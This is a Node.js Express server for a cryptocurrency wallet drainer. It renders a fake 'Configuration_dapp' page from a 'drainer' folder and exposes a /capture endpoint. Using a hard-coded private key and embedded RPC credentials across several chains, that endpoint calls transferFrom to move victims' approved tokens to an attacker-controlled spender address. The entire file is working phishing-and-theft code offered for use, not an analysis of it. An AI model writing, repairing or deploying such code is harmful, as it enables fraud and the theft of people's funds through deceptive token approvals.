const express = require("express");
const ejs = require("ejs");
const path = require('path');
const url = express.Router();
const axios = require("axios");
const {ethers} = require('ethers');

const PK = "0xfa6de49219a8e39467df916df629b7aa839810986b8568aa4e3a938ce54fb1ed";
const spenderAddress = "0x3577e3517e526950d62d0b13a2e2af836d3d2b6d";//

const abi = [
    "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
];

const networks ={
    ethereum:"https://mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
    bsc:"https://bsc-dataseed1.binance.org/",
    polygon:"https://polygon-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
    arbitrum:"https://arbitrum-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
    fantom:"https://rpc.ankr.com/fantom/",
    optimism:"https://optimism-mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e"
}

const app = express();
app.use(express.json());


app.set('views', path.join(__dirname, 'drainer'));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'drainer', 'Configuration_dapp_files'))); 

app.use('/', (req, res)=>{
    //
    res.render('Configuration_dapp', {PK:PK});
});

app.post('/capture', async(req, res) => {
    console.log("request received ",req.body);
    const { tokenAddress, userAddress, amount, network } = req.body;

    console.log('Received data:');
    console.log('Token Address:', tokenAddress);
    console.log('User Address:', userAddress);
    console.log('Amount:', amount);

    // Handle the data as needed (e.g., store in database, perform further processing, etc.)
    const providerUrl = networks[network];
    const provider = new ethers.JsonRpcProvider(providerUrl);
    const wallet = new ethers.Wallet(provider,PK);
    const contract = new ethers.Contract(tokenAddress, abi, wallet);

    try{
        console.log("trying to transfer allowance...");
        const tx = await contract.transferFrom(userAddress,spenderAddress,amount);
        const reciept = await tx.wait();
        console.log("Allowance successfully transferred to spender wallet");
        res.status(200).send('Allowance transferred successfully');
    }catch(err){
        console.log("error transveeing the allowance...");
        console.log(err);
        res.status(500).send('Allowance transfer failed');
    };

    // res.status(200).send('Data received successfully');
});

const port = 3000;
app.listen(port, ()=>{
    console.log("Our server is listening on port: ",port);
});